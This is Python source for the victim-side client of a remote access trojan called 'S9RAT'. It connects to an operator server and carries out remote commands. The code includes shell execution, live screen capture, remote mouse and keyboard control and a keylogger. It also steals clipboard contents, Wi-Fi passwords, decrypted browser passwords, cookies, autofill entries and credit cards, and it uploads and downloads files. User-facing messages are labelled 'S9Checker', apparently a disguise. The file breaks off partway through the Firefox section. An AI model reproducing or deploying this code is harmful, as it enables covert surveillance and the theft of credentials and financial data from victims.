
import socket
import json
import os
import platform
import subprocess
import threading
import time
import logging
import io
from .protocol import (
    pack_message, recv_message, recv_raw, MSG_TYPES,
    DEFAULT_PORT, MAGIC, PROTOCOL_VERSION, set_nodelay,
)

logger = logging.getLogger("S9RAT")

try:
    import mss
    HAS_MSS = True
except ImportError:
    HAS_MSS = False

try:
    from PIL import Image
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

try:
    import pyautogui
    pyautogui.FAILSAFE = False
    HAS_PYAUTOGUI = True
except ImportError:
    HAS_PYAUTOGUI = False


class VictimClient:

    def __init__(self, server_host: str, server_port: int = DEFAULT_PORT,
                 password: str = ""):
        self.server_host = server_host
        self.server_port = server_port
        self.password = password
        self._sock: socket.socket | None = None
        self._running = False
        self._screen_active = False
        self._control_enabled = False
        self._selected_monitor = 0
        self._monitors: list[dict] = []
        self._keylog_active = False
        self._keylog_thread: threading.Thread | None = None
        self._keylog_buffer: list[str] = []
        self._keylog_lock = threading.Lock()
        self._shell_processes: dict[str, subprocess.Popen] = {}

    def connect(self) -> bool:
        try:
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._sock.settimeout(10)
            self._sock.connect((self.server_host, self.server_port))
            set_nodelay(self._sock)
            self._running = True
            self._authenticate()
            return True
        except Exception as e:
            logger.error(f"Connection failed: {e}")
            return False

    def _get_monitor_list(self) -> list[dict]:
        monitors = []
        if HAS_MSS:
            try:
                sct = mss.mss()
                for i, m in enumerate(sct.monitors):
                    if i == 0:
                        continue
                    monitors.append({
                        "index": i,
                        "name": m.get("name", f"Monitor {i}"),
                        "left": m["left"],
                        "top": m["top"],
                        "width": m["width"],
                        "height": m["height"],
                    })
            except Exception:
                pass
        if not monitors:
            monitors = [{"index": 0, "name": "Primary", "left": 0, "top": 0,
                         "width": 1920, "height": 1080}]
        return monitors

    def _authenticate(self):
        self._monitors = self._get_monitor_list()
        auth_msg = pack_message("AUTH", {
            "password": self.password,
            "hostname": platform.node(),
            "username": os.getenv("USERNAME", os.getenv("USER", "unknown")),
            "os": platform.system(),
            "os_version": platform.version(),
            "arch": platform.machine(),
            "pid": os.getpid(),
            "protocol_version": PROTOCOL_VERSION,
            "monitors": self._monitors,
        })
        self._sock.sendall(auth_msg)
        msg_type, data = recv_message(self._sock)
        if msg_type == "AUTH_OK":
            logger.info("Authenticated")
        else:
            raise ConnectionError("Authentication failed")

    def run(self):
        self._running = True
        threads = [
            threading.Thread(target=self._command_loop, daemon=True),
            threading.Thread(target=self._screen_loop, daemon=True),
            threading.Thread(target=self._heartbeat_loop, daemon=True),
        ]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

    def _heartbeat_loop(self):
        while self._running:
            try:
                self._sock.sendall(pack_message("HEARTBEAT_ACK", {}))
            except Exception:
                break
            time.sleep(15)

    def _command_loop(self):
        while self._running:
            try:
                msg_type, data = recv_message(self._sock)
                self._handle_command(msg_type, data)
            except ConnectionError:
                logger.info("Disconnected")
                self._running = False
                break
            except Exception as e:
                logger.error(f"Command error: {e}")
                time.sleep(0.1)

    def _handle_command(self, msg_type: str, data: dict):
        if msg_type == "HEARTBEAT":
            self._sock.sendall(pack_message("HEARTBEAT_ACK", {}))
        elif msg_type == "SCREEN_START":
            self._screen_active = True
        elif msg_type == "SCREEN_STOP":
            self._screen_active = False
        elif msg_type == "SCREEN_SELECT":
            self._selected_monitor = data.get("monitor_index", 0)
        elif msg_type == "CONTROL_ENABLE":
            self._control_enabled = True
        elif msg_type == "CONTROL_DISABLE":
            self._control_enabled = False
        elif msg_type == "CONTROL_INPUT" and self._control_enabled:
            self._execute_input(data)
        elif msg_type == "EXFIL_REQUEST":
            self._handle_exfil(data.get("type", ""))
        elif msg_type == "SHUTDOWN":
            self._power_action("shutdown")
        elif msg_type == "RESTART":
            self._power_action("restart")
        elif msg_type == "LOGOFF":
            self._power_action("logoff")
        elif msg_type == "SHELL_EXEC":
            self._handle_shell_exec(data)
        elif msg_type == "PROCESS_LIST":
            self._handle_process_list()
        elif msg_type == "PROCESS_KILL":
            self._handle_process_kill(data)
        elif msg_type == "KEYLOG_START":
            self._start_keylog()
        elif msg_type == "KEYLOG_STOP":
            self._stop_keylog()
        elif msg_type == "CLIPBOARD_GET":
            self._handle_clipboard()
        elif msg_type == "CHAT_SEND":
            self._handle_chat_display(data)
        elif msg_type == "SCREENSHOT":
            self._take_screenshot()
        elif msg_type == "FILE_BROWSE":
            self._handle_file_browse(data)
        elif msg_type == "FILE_TRANSFER":
            self._handle_file_transfer_init(data)
        elif msg_type == "FILE_DOWNLOAD":
            self._handle_file_download(data)

    def _execute_input(self, data: dict):
        if not HAS_PYAUTOGUI:
            return
        try:
            input_type = data.get("input_type", "")
            x = data.get("x", 0)
            y = data.get("y", 0)

            if self._selected_monitor > 0 and HAS_MSS:
                sct = mss.mss()
                if self._selected_monitor < len(sct.monitors):
                    mon = sct.monitors[self._selected_monitor]
                    x += mon["left"]
                    y += mon["top"]

            if input_type == "mouse_move":
                pyautogui.moveTo(x, y, duration=0.02)
            elif input_type == "mouse_click":
                pyautogui.click(x, y, button=data.get("button", "left"))
            elif input_type == "mouse_double":
                pyautogui.doubleClick(x, y)
            elif input_type == "mouse_down":
                pyautogui.mouseDown(x, y, button=data.get("button", "left"))
            elif input_type == "mouse_up":
                pyautogui.mouseUp(x, y, button=data.get("button", "left"))
            elif input_type == "mouse_scroll":
                pyautogui.scroll(data.get("amount", 0), x, y)
            elif input_type == "key_press":
                pyautogui.press(data.get("key", ""))
            elif input_type == "key_down":
                pyautogui.keyDown(data.get("key", ""))
            elif input_type == "key_up":
                pyautogui.keyUp(data.get("key", ""))
            elif input_type == "type_text":
                pyautogui.typewrite(data.get("text", ""), interval=0.01)
        except Exception as e:
            logger.error(f"Input error: {e}")

    def _screen_loop(self):
        if not HAS_MSS or not HAS_PIL:
            logger.error("mss or Pillow not installed for screen capture")
            return

        sct = mss.mss()
        while self._running:
            if self._screen_active:
                try:
                    monitors = sct.monitors
                    idx = self._selected_monitor
                    if idx < len(monitors):
                        monitor = monitors[idx] if idx > 0 else monitors[0]
                    else:
                        monitor = monitors[0]

                    screenshot = sct.grab(monitor)
                    img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
                    buf = io.BytesIO()
                    img.save(buf, format="JPEG", quality=50, optimize=False)
                    frame_data = buf.getvalue()

                    self._sock.sendall(pack_message("SCREEN_FRAME", {"size": len(frame_data)}))
                    self._sock.sendall(frame_data)
                except Exception as e:
                    logger.error(f"Screen capture error: {e}")
                    time.sleep(0.5)
            time.sleep(0.05)

    def _power_action(self, action: str):
        try:
            if platform.system() == "Windows":
                if action == "shutdown":
                    subprocess.run("shutdown /s /t 0", shell=True)
                elif action == "restart":
                    subprocess.run("shutdown /r /t 0", shell=True)
                elif action == "logoff":
                    subprocess.run("shutdown /l", shell=True)
            else:
                if action == "shutdown":
                    subprocess.run("shutdown -h now", shell=True)
                elif action == "restart":
                    subprocess.run("shutdown -r now", shell=True)
                elif action == "logoff":
                    subprocess.run("logout", shell=True)
        except Exception as e:
            logger.error(f"Power action error: {e}")

    def _handle_shell_exec(self, data: dict):
        cmd = data.get("command", "")
        if not cmd:
            return
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=30,
                encoding="utf-8", errors="replace",
            )
            output = result.stdout + result.stderr
            self._sock.sendall(pack_message("SHELL_OUTPUT", {
                "command": cmd,
                "output": output[:50000],
                "returncode": result.returncode,
            }))
        except subprocess.TimeoutExpired:
            self._sock.sendall(pack_message("SHELL_OUTPUT", {
                "command": cmd,
                "output": "[timeout after 30s]",
                "returncode": -1,
            }))
        except Exception as e:
            self._sock.sendall(pack_message("SHELL_OUTPUT", {
                "command": cmd,
                "output": str(e),
                "returncode": -1,
            }))

    def _handle_process_list(self):
        try:
            import psutil
            procs = []
            for p in psutil.process_iter(["pid", "name", "username", "cpu_percent", "memory_percent"]):
                try:
                    info = p.info
                    procs.append({
                        "pid": info["pid"],
                        "name": info["name"],
                        "username": info.get("username", ""),
                        "cpu": round(info.get("cpu_percent", 0), 1),
                        "memory": round(info.get("memory_percent", 0), 1),
                    })
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
            self._sock.sendall(pack_message("PROCESS_DATA", {"processes": procs}))
        except ImportError:
            self._sock.sendall(pack_message("PROCESS_DATA", {"error": "psutil not installed"}))

    def _handle_process_kill(self, data: dict):
        pid = data.get("pid", 0)
        try:
            import psutil
            p = psutil.Process(pid)
            p.kill()
            self._sock.sendall(pack_message("PROCESS_DATA", {"killed": pid}))
        except Exception as e:
            self._sock.sendall(pack_message("PROCESS_DATA", {"error": str(e)}))

    def _start_keylog(self):
        if self._keylog_active:
            return
        self._keylog_active = True
        self._keylog_buffer = []
        self._keylog_thread = threading.Thread(target=self._keylog_loop, daemon=True)
        self._keylog_thread.start()

    def _stop_keylog(self):
        self._keylog_active = False

    def _keylog_loop(self):
        try:
            from pynput import keyboard

            def on_press(key):
                if not self._keylog_active:
                    return False
                try:
                    char = key.char
                    if char:
                        with self._keylog_lock:
                            self._keylog_buffer.append(char)
                except AttributeError:
                    name = str(key).replace("Key.", "")
                    with self._keylog_lock:
                        self._keylog_buffer.append(f"[{name}]")

            with keyboard.Listener(on_press=on_press) as listener:
                while self._keylog_active:
                    time.sleep(2)
                    with self._keylog_lock:
                        if self._keylog_buffer:
                            data = "".join(self._keylog_buffer)
                            self._keylog_buffer = []
                        else:
                            data = ""
                    if data:
                        try:
                            self._sock.sendall(pack_message("KEYLOG_DATA", {"keys": data}))
                        except Exception:
                            break
                    time.sleep(0.5)
        except ImportError:
            logger.error("pynput not installed for keylogger")
            self._keylog_active = False
        except Exception as e:
            logger.error(f"Keylog error: {e}")
            self._keylog_active = False

    def _handle_clipboard(self):
        try:
            import pyperclip
            content = pyperclip.paste()
            self._sock.sendall(pack_message("CLIPBOARD_DATA", {"content": str(content)}))
        except ImportError:
            try:
                if platform.system() == "Windows":
                    result = subprocess.run(
                        "powershell -command Get-Clipboard",
                        shell=True, capture_output=True, text=True, timeout=5,
                    )
                    self._sock.sendall(pack_message("CLIPBOARD_DATA", {"content": result.stdout.strip()}))
                else:
                    self._sock.sendall(pack_message("CLIPBOARD_DATA", {"content": ""}))
            except Exception:
                self._sock.sendall(pack_message("CLIPBOARD_DATA", {"content": ""}))

    def _handle_chat_display(self, data: dict):
        msg = data.get("message", "")
        if not msg:
            return
        try:
            if platform.system() == "Windows":
                try:
                    import ctypes
                    ctypes.windll.user32.MessageBoxW(0, msg, "S9Checker Message", 0x40 | 0x1000)
                except Exception:
                    subprocess.run(
                        f'msg * "{msg}"',
                        shell=True, timeout=5,
                    )
            else:
                subprocess.run(
                    f'notify-send "S9Checker" "{msg}"',
                    shell=True, timeout=5,
                )
        except Exception as e:
            logger.error(f"Chat display error: {e}")

    def _handle_exfil(self, exfil_type: str):
        data = {}
        try:
            if exfil_type == "system_info":
                data = self._get_system_info()
            elif exfil_type == "wifi_passwords":
                data = self._get_wifi_passwords()
            elif exfil_type == "browser_creds":
                data = self._get_browser_creds()
            elif exfil_type == "file_list":
                data = self._get_file_list()
            elif exfil_type == "geolocation":
                data = self._get_geolocation()
            elif exfil_type == "browser_cookies":
                data = self._get_browser_cookies()
            elif exfil_type == "infostealer":
                data = self._get_infostealer()
            elif exfil_type == "crypto_stealer":
                data = self._get_crypto_stealer()
        except Exception as e:
            data = {"error": str(e)}

        self._sock.sendall(pack_message("EXFIL_DATA", {
            "type": exfil_type,
            "data": data,
        }))

    def _get_system_info(self) -> dict:
        info = {
            "hostname": platform.node(),
            "username": os.getenv("USERNAME", os.getenv("USER", "unknown")),
            "os": platform.system(),
            "os_version": platform.version(),
            "arch": platform.machine(),
            "processor": platform.processor(),
            "cwd": os.getcwd(),
            "python_version": platform.python_version(),
        }
        try:
            result = subprocess.run("ipconfig" if platform.system() == "Windows" else "ifconfig",
                                    shell=True, capture_output=True, text=True, timeout=5)
            info["network"] = result.stdout[:2000]
        except Exception:
            pass
        return info

    def _get_wifi_passwords(self) -> dict:
        passwords = {}
        try:
            if platform.system() == "Windows":
                result = subprocess.run(
                    "netsh wlan show profiles",
                    shell=True, capture_output=True, text=True, timeout=10
                )
                profiles = []
                for line in result.stdout.split("\n"):
                    if "All User Profile" in line:
                        profile = line.split(":")[-1].strip()
                        profiles.append(profile)
                for profile in profiles:
                    result = subprocess.run(
                        f'netsh wlan show profile name="{profile}" key=clear',
                        shell=True, capture_output=True, text=True, timeout=10
                    )
                    for line in result.stdout.split("\n"):
                        if "Key Content" in line:
                            pwd = line.split(":")[-1].strip()
                            passwords[profile] = pwd
        except Exception as e:
            passwords["_error"] = str(e)
        return passwords

    def _get_browser_creds(self) -> dict:
        creds = {"chrome": [], "edge": [], "autofill": []}
        try:
            if platform.system() == "Windows":
                import sqlite3
                import shutil
                import base64

                def _decrypt_chrome_password(encrypted_password: bytes, local_state_path: str) -> str:
                    try:
                        with open(local_state_path, "r", encoding="utf-8") as f:
                            local_state = json.load(f)
                        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                        encrypted_key = encrypted_key[5:]
                        import ctypes
                        import ctypes.wintypes

                        class DATA_BLOB(ctypes.Structure):
                            _fields_ = [("cbData", ctypes.wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]

                        blob_in = DATA_BLOB(len(encrypted_key), ctypes.create_string_buffer(encrypted_key, len(encrypted_key)))
                        blob_out = DATA_BLOB()
                        if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
                            aes_key = ctypes.string_at(blob_out.pbData, blob_out.cbData)
                            ctypes.windll.kernel32.LocalFree(blob_out.pbData)
                        else:
                            return "[decryption failed]"
                        if encrypted_password[:3] == b"v10":
                            nonce = encrypted_password[3:15]
                            ciphertext = encrypted_password[15:-16]
                            tag = encrypted_password[-16:]
                            from Crypto.Cipher import AES
                            cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
                            return cipher.decrypt_and_verify(ciphertext, tag).decode("utf-8", errors="replace")
                        return "[unsupported format]"
                    except Exception:
                        return "[decryption failed]"

                def _read_browser_logins(browser_name: str, user_data_path: str, profile: str = "Default"):
                    logins = []
                    login_db = os.path.join(user_data_path, profile, "Login Data")
                    local_state = os.path.join(user_data_path, "Local State")
                    if not os.path.exists(login_db):
                        return logins
                    temp_path = login_db + ".tmp"
                    try:
                        shutil.copy2(login_db, temp_path)
                        conn = sqlite3.connect(temp_path)
                        cursor = conn.execute("SELECT origin_url, username_value, password_value FROM logins")
                        for row in cursor:
                            password = "[encrypted]"
                            if row[2]:
                                password = _decrypt_chrome_password(row[2], local_state)
                            logins.append({"url": row[0], "username": row[1], "password": password})
                        conn.close()
                        os.remove(temp_path)
                    except Exception:
                        try:
                            os.remove(temp_path)
                        except Exception:
                            pass
                    return logins

                def _read_autofill(user_data_path: str, profile: str = "Default"):
                    entries = []
                    web_data = os.path.join(user_data_path, profile, "Web Data")
                    if not os.path.exists(web_data):
                        return entries
                    temp_path = web_data + ".tmp"
                    try:
                        shutil.copy2(web_data, temp_path)
                        conn = sqlite3.connect(temp_path)
                        cursor = conn.execute("SELECT name, value FROM autofill")
                        for row in cursor:
                            if row[0] and row[1]:
                                entries.append({"field": row[0], "value": row[1]})
                        conn.close()
                        os.remove(temp_path)
                    except Exception:
                        try:
                            os.remove(temp_path)
                        except Exception:
                            pass
                    return entries

                chrome_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")
                if os.path.exists(chrome_path):
                    creds["chrome"] = _read_browser_logins("chrome", chrome_path, "Default")
                    creds["autofill"] = _read_autofill(chrome_path, "Default")

                edge_path = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data")
                if os.path.exists(edge_path):
                    creds["edge"] = _read_browser_logins("edge", edge_path, "Default")
                    if not creds["autofill"]:
                        creds["autofill"] = _read_autofill(edge_path, "Default")
        except Exception as e:
            creds["_error"] = str(e)
        return creds

    def _get_file_list(self) -> dict:
        listing = {}
        for drive in ["C:\\", "D:\\"]:
            if os.path.exists(drive):
                try:
                    entries = os.listdir(drive)[:100]
                    listing[drive] = entries
                except Exception:
                    pass
        return listing

    def _take_screenshot(self):
        if not HAS_MSS or not HAS_PIL:
            return
        try:
            sct = mss.mss()
            monitors = sct.monitors
            idx = self._selected_monitor
            if idx < len(monitors):
                monitor = monitors[idx] if idx > 0 else monitors[0]
            else:
                monitor = monitors[0]
            screenshot = sct.grab(monitor)
            img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
            buf = io.BytesIO()
            img.save(buf, format="JPEG", quality=70, optimize=False)
            frame_data = buf.getvalue()
            self._sock.sendall(pack_message("SCREEN_FRAME", {"size": len(frame_data)}))
            self._sock.sendall(frame_data)
        except Exception as e:
            logger.error(f"Screenshot error: {e}")

    def _handle_file_browse(self, data: dict):
        path = data.get("path", "")
        entries = []
        try:
            if not path:
                if platform.system() == "Windows":
                    import string
                    for letter in string.ascii_uppercase:
                        drive = f"{letter}:\\"
                        if os.path.exists(drive):
                            try:
                                st = os.stat(drive)
                                entries.append({"name": drive, "is_dir": True, "size": 0, "modified": st.st_mtime})
                            except Exception:
                                entries.append({"name": drive, "is_dir": True, "size": 0, "modified": 0})
                else:
                    entries.append({"name": "/", "is_dir": True, "size": 0, "modified": 0})
            else:
                for item in os.scandir(path):
                    try:
                        st = item.stat()
                        entries.append({
                            "name": item.name,
                            "is_dir": item.is_dir(),
                            "size": st.st_size if not item.is_dir() else 0,
                            "modified": st.st_mtime,
                        })
                    except PermissionError:
                        entries.append({"name": item.name, "is_dir": item.is_dir(), "size": 0, "modified": 0})
                    except Exception:
                        pass
        except Exception as e:
            logger.error(f"File browse error: {e}")
        self._sock.sendall(pack_message("EXFIL_DATA", {
            "type": "file_browse",
            "data": {"path": path, "entries": entries},
        }))

    def _handle_file_transfer_init(self, data: dict):
        filename = data.get("filename", "")
        size = data.get("size", 0)
        dest_path = data.get("dest_path", "")
        if not dest_path:
            dest_path = os.path.join(os.environ.get("TEMP", os.getcwd()), filename)
        try:
            self._sock.sendall(pack_message("FILE_TRANSFER_DATA", {"status": "ready"}))
            received = 0
            with open(dest_path, "wb") as f:
                while received < size:
                    chunk_size = min(65536, size - received)
                    chunk = recv_raw(self._sock, chunk_size)
                    f.write(chunk)
                    received += len(chunk)
            self._sock.sendall(pack_message("FILE_TRANSFER_END", {
                "status": "done", "path": dest_path, "size": received,
            }))
            logger.info(f"File received: {dest_path} ({received} bytes)")
        except Exception as e:
            logger.error(f"File transfer error: {e}")
            try:
                self._sock.sendall(pack_message("FILE_TRANSFER_END", {
                    "status": "error", "error": str(e),
                }))
            except Exception:
                pass

    def _handle_file_download(self, data: dict):
        path = data.get("path", "")
        try:
            if not os.path.exists(path):
                self._sock.sendall(pack_message("EXFIL_DATA", {
                    "type": "file_download",
                    "data": {"error": "File not found", "path": path},
                }))
                return
            size = os.path.getsize(path)
            filename = os.path.basename(path)
            self._sock.sendall(pack_message("FILE_DOWNLOAD_DATA", {
                "filename": filename, "size": size,
            }))
            with open(path, "rb") as f:
                while True:
                    chunk = f.read(65536)
                    if not chunk:
                        break
                    self._sock.sendall(chunk)
            logger.info(f"File sent: {path} ({size} bytes)")
        except Exception as e:
            logger.error(f"File download error: {e}")

    def _get_geolocation(self) -> dict:
        try:
            import urllib.request
            resp = urllib.request.urlopen("http://ip-api.com/json/", timeout=10)
            data = json.loads(resp.read())
            return {
                "ip": data.get("query", ""),
                "city": data.get("city", ""),
                "region": data.get("regionName", ""),
                "country": data.get("country", ""),
                "country_code": data.get("countryCode", ""),
                "lat": data.get("lat", ""),
                "lon": data.get("lon", ""),
                "isp": data.get("isp", ""),
                "org": data.get("org", ""),
                "as": data.get("as", ""),
                "timezone": data.get("timezone", ""),
            }
        except Exception as e:
            return {"error": str(e)}

    def _get_browser_cookies(self) -> dict:
        result = {"chrome": [], "edge": []}
        try:
            if platform.system() == "Windows":
                import sqlite3
                import shutil
                import base64

                def _decrypt_value(encrypted_value: bytes, local_state_path: str) -> str:
                    try:
                        with open(local_state_path, "r", encoding="utf-8") as f:
                            local_state = json.load(f)
                        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                        encrypted_key = encrypted_key[5:]
                        import ctypes
                        import ctypes.wintypes

                        class DATA_BLOB(ctypes.Structure):
                            _fields_ = [("cbData", ctypes.wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]

                        blob_in = DATA_BLOB(len(encrypted_key), ctypes.create_string_buffer(encrypted_key, len(encrypted_key)))
                        blob_out = DATA_BLOB()
                        if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
                            aes_key = ctypes.string_at(blob_out.pbData, blob_out.cbData)
                            ctypes.windll.kernel32.LocalFree(blob_out.pbData)
                        else:
                            return ""
                        if encrypted_value[:3] == b"v10":
                            nonce = encrypted_value[3:15]
                            ciphertext = encrypted_value[15:-16]
                            tag = encrypted_value[-16:]
                            from Crypto.Cipher import AES
                            cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
                            return cipher.decrypt_and_verify(ciphertext, tag).decode("utf-8", errors="replace")
                        return ""
                    except Exception:
                        return ""

                def _read_cookies(browser_name: str, user_data_path: str):
                    cookies = []
                    cookies_db = os.path.join(user_data_path, "Default", "Network", "Cookies")
                    local_state = os.path.join(user_data_path, "Local State")
                    if not os.path.exists(cookies_db):
                        cookies_db = os.path.join(user_data_path, "Default", "Cookies")
                    if not os.path.exists(cookies_db):
                        return cookies
                    temp_path = cookies_db + ".tmp"
                    try:
                        shutil.copy2(cookies_db, temp_path)
                        conn = sqlite3.connect(temp_path)
                        cursor = conn.execute(
                            "SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies "
                            "WHERE host_key NOT LIKE '%google%' OR host_key LIKE '%gmail%' OR host_key LIKE '%youtube%'"
                        )
                        for row in cursor:
                            value = ""
                            if row[2]:
                                value = _decrypt_value(row[2], local_state)
                            if not value:
                                value = "[encrypted]"
                            cookies.append({
                                "host": row[0],
                                "name": row[1],
                                "value": value,
                                "path": row[3],
                                "expires": row[4],
                                "secure": bool(row[5]),
                                "httponly": bool(row[6]),
                            })
                        conn.close()
                        os.remove(temp_path)
                    except Exception:
                        try:
                            os.remove(temp_path)
                        except Exception:
                            pass
                    return cookies

                chrome_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")
                if os.path.exists(chrome_path):
                    result["chrome"] = _read_cookies("chrome", chrome_path)

                edge_path = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data")
                if os.path.exists(edge_path):
                    result["edge"] = _read_cookies("edge", edge_path)
        except Exception as e:
            result["_error"] = str(e)
        return result

    def _get_infostealer(self) -> dict:
        """Full infostealer: credentials, cookies, autofill, credit cards, history, bookmarks from all browsers."""
        result = {}
        try:
            import shutil, sqlite3, tempfile, json
            from pathlib import Path

            def _decrypt_chrome_value(encrypted_value: bytes, profile_path: str) -> str:
                if not encrypted_value or len(encrypted_value) < 3:
                    return ""
                if encrypted_value[:3] == b"v10" or encrypted_value[:3] == b"v20":
                    try:
                        import win32crypt
                        local_state_path = os.path.join(
                            os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data", "Local State"
                        )
                        if os.path.exists(local_state_path):
                            with open(local_state_path, "r", encoding="utf-8") as f:
                                local_state = json.load(f)
                            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                            import win32crypt
                            decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                            from Crypto.Cipher import AES
                            if encrypted_value[:3] == b"v10":
                                iv = encrypted_value[3:15]
                                ciphertext = encrypted_value[15:]
                                cipher = AES.new(decrypted_key, AES.MODE_GCM, iv)
                                return cipher.decrypt_and_verify(ciphertext, ciphertext[-16:]).decode("utf-8", errors="replace")
                            else:
                                return ""
                    except Exception:
                        pass
                try:
                    import win32crypt
                    return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode("utf-8", errors="replace")
                except Exception:
                    return ""

            def _copy_locked_db(src_path: str) -> str:
                tmp = os.path.join(tempfile.gettempdir(), f"s9r_{os.path.basename(src_path)}")
                shutil.copy2(src_path, tmp)
                return tmp

            def _collect_browser(browser_name: str, user_data_path: str) -> dict:
                data = {
                    "passwords": [], "cookies": [], "autofill": [],
                    "credit_cards": [], "history": [], "bookmarks": [],
                    "local_storage": [],
                }
                if not os.path.exists(user_data_path):
                    return data
                for profile in os.listdir(user_data_path):
                    profile_dir = os.path.join(user_data_path, profile)
                    if not os.path.isdir(profile_dir) or profile.startswith("System") or profile == "Default" and not os.path.exists(os.path.join(profile_dir, "Preferences")):
                        if profile != "Default":
                            continue
                    for db_name, collector in [
                        ("Login Data", _collect_passwords),
                        ("Cookies", _collect_cookies),
                        ("Web Data", _collect_autofill_and_cards),
                    ]:
                        db_path = os.path.join(profile_dir, db_name)
                        if os.path.exists(db_path):
                            try:
                                tmp = _copy_locked_db(db_path)
                                conn = sqlite3.connect(tmp)
                                collected = collector(conn, profile_dir, browser_name)
                                for k, v in collected.items():
                                    data[k].extend(v) if isinstance(v, list) else None
                                conn.close()
                                os.remove(tmp)
                            except Exception:
                                try: os.remove(tmp)
                                except: pass

                    history_db = os.path.join(profile_dir, "History")
                    if os.path.exists(history_db):
                        try:
                            tmp = _copy_locked_db(history_db)
                            conn = sqlite3.connect(tmp)
                            cur = conn.cursor()
                            cur.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500")
                            for row in cur.fetchall():
                                data["history"].append({"url": row[0], "title": row[1], "visits": row[2]})
                            conn.close()
                            os.remove(tmp)
                        except Exception:
                            try: os.remove(tmp)
                            except: pass

                    bookmarks_file = os.path.join(profile_dir, "Bookmarks")
                    if os.path.exists(bookmarks_file):
                        try:
                            with open(bookmarks_file, "r", encoding="utf-8") as f:
                                bk = json.load(f)
                            def _walk_bookmarks(node, depth=0):
                                if depth > 5: return
                                if node.get("type") == "url":
                                    data["bookmarks"].append({"name": node.get("name",""), "url": node.get("url","")})
                                for child in node.get("children", []):
                                    _walk_bookmarks(child, depth+1)
                            for root_key in bk.get("roots", {}):
                                root = bk["roots"][root_key]
                                if isinstance(root, dict):
                                    _walk_bookmarks(root)
                        except Exception:
                            pass

                    for store_name in ["Local Storage", "Session Storage"]:
                        store_dir = os.path.join(profile_dir, store_name)
                        if os.path.isdir(store_dir):
                            lsdb = os.path.join(store_dir, "leveldb")
                            if os.path.isdir(lsdb):
                                for fn in os.listdir(lsdb):
                                    if fn.endswith(".log") or fn.endswith(".ldb"):
                                        try:
                                            with open(os.path.join(lsdb, fn), "r", encoding="utf-8", errors="replace") as f:
                                                content = f.read(100000)
                                            if content.strip():
                                                data["local_storage"].append({"source": f"{browser_name}/{profile}/{store_name}", "content": content[:5000]})
                                        except Exception:
                                            pass
                return data

            def _collect_passwords(conn, profile_path, browser_name) -> dict:
                result = {"passwords": []}
                try:
                    cur = conn.cursor()
                    cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for row in cur.fetchall():
                        pwd = _decrypt_chrome_value(row[2], profile_path)
                        if pwd:
                            result["passwords"].append({
                                "url": row[0], "username": row[1], "password": pwd
                            })
                except Exception:
                    pass
                return result

            def _collect_cookies(conn, profile_path, browser_name) -> dict:
                result = {"cookies": []}
                try:
                    cur = conn.cursor()
                    cur.execute("SELECT host_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies")
                    for row in cur.fetchall():
                        val = row[2] if row[2] else _decrypt_chrome_value(row[3], profile_path)
                        if val:
                            result["cookies"].append({
                                "host": row[0], "name": row[1], "value": val,
                                "path": row[4], "secure": bool(row[6]), "httponly": bool(row[7]),
                            })
                except Exception:
                    pass
                return result

            def _collect_autofill_and_cards(conn, profile_path, browser_name) -> dict:
                result = {"autofill": [], "credit_cards": []}
                try:
                    cur = conn.cursor()
                    cur.execute("SELECT name, value FROM autofill")
                    for row in cur.fetchall():
                        result["autofill"].append({"name": row[0], "value": row[1]})
                except Exception:
                    pass
                try:
                    cur = conn.cursor()
                    cur.execute("SELECT name_on_card, card_number_encrypted, expiry_month, expiry_year FROM credit_cards")
                    for row in cur.fetchall():
                        card_num = _decrypt_chrome_value(row[1], profile_path)
                        result["credit_cards"].append({
                            "name": row[0], "number": card_num,
                            "expiry": f"{row[2]}/{row[3]}"
                        })
                except Exception:
                    pass
                return result

            # Chrome
            chrome_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")
            if os.path.exists(chrome_path):
                result["chrome"] = _collect_browser("Chrome", chrome_path)

            # Edge
            edge_path = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data")
            if os.path.exists(edge_path):
                result["edge"] = _collect_browser("Edge", edge_path)

            # Brave
            brave_path = os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data")
            if os.path.exists(brave_path):
                result["brave"] = _collect_browser("Brave", brave_path)

            # Opera
            opera_path = os.path.expandvars(r"%LOCALAPPDATA%\Opera Software\Opera Stable")
            if os.path.exists(opera_path):
                result["opera"] = _collect_browser("Opera", opera_path)

            # Vivaldi
            vivaldi_path = os.path.expandvars(r"%LOCALAPPDATA%\Vivaldi\User Data")
            if os.path.exists(vivaldi_path):
                result["vivaldi"] = _collect_browser("Vivaldi", vivaldi_path)

            # Firefox
            ff_base = os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles")
            if os.path.exists(ff_base):
